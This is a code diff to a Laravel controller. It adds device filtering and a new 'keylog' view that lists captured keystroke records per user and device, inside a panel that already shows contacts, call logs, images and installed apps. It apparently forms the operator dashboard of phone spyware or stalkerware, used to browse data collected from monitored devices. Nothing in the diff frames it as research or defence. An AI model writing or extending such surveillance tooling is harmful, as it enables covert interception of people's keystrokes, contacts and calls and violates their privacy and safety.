@@ -5,11 +5,13 @@ namespace App\Http\Controllers;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use App\Models\User;
+use App\Models\Device;
 use App\Models\Contact;
 use App\Models\CallLog;
 use App\Models\UserImage;
 use App\Models\App;
 use App\Models\AppIcon;
+use App\Models\KeyLog;
 use Illuminate\Support\Facades\Storage;
 use ZipArchive;
 
@@ -33,16 +35,49 @@ class UserController extends Controller
         return view('user.view', compact('user'));
     }
 
-    public function app($id)
+    public function app($id, Request $request)
     {
-        $user = User::with(['contacts', 'callLogs', 'images'])->findOrFail($id);
+        $devices = Device::orderBy('device_name')->get();
 
-        $apps = App::with(['appIcon'])
-            ->where('user_id', $id)
-            ->orderBy('last_seen_at', 'desc')
+        if ($request->device_id) {
+            $selectedDevice = Device::find($request->device_id);
+            $user = User::findOrFail($selectedDevice->user_id);
+        } else {
+            // Auto-select first device belonging to this user
+            $selectedDevice = Device::where('user_id', $id)->first();
+            $user = User::findOrFail($id);
+        }
+
+        $apps = App::query()
+            ->with(['appIcon'])
+            ->where('user_id', $user->id)
+            ->when($selectedDevice, fn($q, $v) => $q->where('device_id', $v->id))
+            ->latest()
             ->get();
 
-        return view('user.app', compact('user', 'apps'));
+        return view('user.app', compact('apps', 'devices', 'selectedDevice', 'user'));
+    }
+
+    public function keylog($id, Request $request)
+    {
+        $devices = Device::orderBy('device_name')->get();
+
+        if ($request->device_id) {
+            $selectedDevice = Device::find($request->device_id);
+            $user = User::findOrFail($selectedDevice->user_id);
+        } else {
+            $selectedDevice = Device::where('user_id', $id)->first();
+            $user = User::findOrFail($id);
+        }
+
+        $keylogs = KeyLog::query()
+            ->with(['appIcon'])
+            ->where('user_id', $user->id)
+            ->when($selectedDevice, fn($q, $v) => $q->where('device_id', $v->id))
+            ->latest('captured_at')
+            ->get();
+
+        return view('user.keylog', compact('keylogs', 'devices', 'selectedDevice', 'user'));
     }
 
     public function uploadIcon(Request $request)
